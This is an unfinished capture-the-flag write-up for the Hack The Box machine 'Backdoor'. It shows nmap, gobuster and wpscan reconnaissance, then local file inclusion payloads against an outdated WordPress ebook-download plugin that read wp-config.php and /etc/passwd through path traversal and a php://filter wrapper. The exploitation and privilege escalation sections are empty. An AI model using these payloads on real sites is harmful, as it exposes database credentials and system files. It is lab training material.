# Backdoor

## Information Gathering
10.10.11.125
Backdoor

admin

## Enumeration and Scanning
Run nmap scan. I thought that because the box is named "Backdoor" there may be a service on an uncommon port but there isn't.<br>
```bash
# Nmap 7.92 scan initiated Wed Jan  5 15:24:18 2022 as: nmap -p- -sC -sV -oN nmap/backdoor-all.nmap 10.10.11.125
Nmap scan report for 10.10.11.125
Host is up (0.046s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: WordPress 5.8.1
|_http-title: Backdoor &#8211; Real-Life
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan  5 15:24:45 2022 -- 1 IP address (1 host up) scanned in 26.71 seconds

```

This is running a WordPress application, which I'm unfamialar with. I'll be using <a href="https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress">this</a> guide in order to get foothold on this machine.

Running Gobuster for directory busting:<br>
```bash
gobuster dir -u http://10.10.11.125 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x html,php,txt -o gob/backdoor.gob

/wp-content           (Status: 301) [Size: 317] [--> http://10.10.11.125/wp-content/]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.11.125/]
/wp-login.php         (Status: 200) [Size: 5674]
/license.txt          (Status: 200) [Size: 19915]
/wp-includes          (Status: 301) [Size: 318] [--> http://10.10.11.125/wp-includes/]
/readme.html          (Status: 200) [Size: 7346]
/wp-trackback.php     (Status: 200) [Size: 135]
/wp-admin             (Status: 301) [Size: 315] [--> http://10.10.11.125/wp-admin/]
/xmlrpc.php           (Status: 405) [Size: 42]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://10.10.11.125/wp-login.php?action=register]
/server-status        (Status: 403) [Size: 277]
```
Lastly, for enumeration and scanning I ran wpscan. The results can found <a href="">here</a>. I'll put the command for the scan:<br>
```bash
wpscan --url http://backdoor.htb -e ap,at,u --plugins-detection aggressive -f cli-no-color -o backdoor.wpscan
```
In the scan, the main point of interest is the plugins.<br>
```bash
[+] ebook-download
 | Location: http://backdoor.htb/wp-content/plugins/ebook-download/
 | Last Updated: 2020-03-12T12:52:00.000Z
 | Readme: http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/, status: 200
 |
 | Version: 1.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt

```
This plugin is outdated and an <a href="https://www.exploit-db.com/exploits/39575">Exploit-DB PoC</a>. With a LFI I can leak sensitive information about the WordPress site or the system itself. The obvious file to leak is the wp-config.php which contains the root password to the database. The payload of the LFI looks like:<br>
```
http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
```
If you try to examine any files that are not WordPress related you get a strange output. Thus your payload will need to be:<br>
```bash
curl -X GET http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=php://filter/convert.base64-encode/resource=/etc/passwd
```
Which outputs a lot of Base64 encoded data. After decoding you get what you are after.<br>

## Exploitation

## Privilege Escalation